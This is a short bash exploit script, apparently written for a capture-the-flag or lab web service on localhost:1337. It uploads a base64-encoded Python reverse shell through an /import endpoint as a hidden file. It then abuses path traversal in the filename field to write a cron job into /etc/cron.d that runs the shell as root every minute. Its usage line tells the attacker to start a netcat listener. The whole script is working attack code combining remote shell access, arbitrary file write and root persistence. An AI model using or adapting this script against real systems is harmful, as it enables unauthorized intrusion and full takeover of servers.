#!/bin/bash
# Usage: ./pwn.sh <AttackerIP> <revPORT>
# rev shell run nc -lnvp port

IP=$1
PORT=$2

if [ -z "$IP" ] || [ -z "$PORT" ]; then
  echo "Usage: $0 <IP> <PORT>"
  exit 1
fi

#Generate base64 of Python reverse shell
PAYLOAD=$(cat <<EOF
import socket,os,pty
s=socket.socket()
s.connect(("$IP",$PORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
EOF
)

B64PAYLOAD=$(echo "$PAYLOAD" | base64 -w0)

curl -s -X POST http://localhost:1337/import \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "url=data:text/plain;base64,$B64PAYLOAD" \
  --data-urlencode 'filename=.bb.py'

CRONLINE="* * * * * root /usr/bin/python3 /app/uploads/.bb.py"
B64CRON=$(echo "$CRONLINE" | base64 -w0)
# bypass folder
curl -s -X POST http://localhost:1337/import \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "url=data:text/plain;base64,$B64CRON" \
  --data-urlencode 'filename=../../../../../../etc/cron.d/bbb'

echo "[+] Payload and cron job installed. wait ~1 minute."
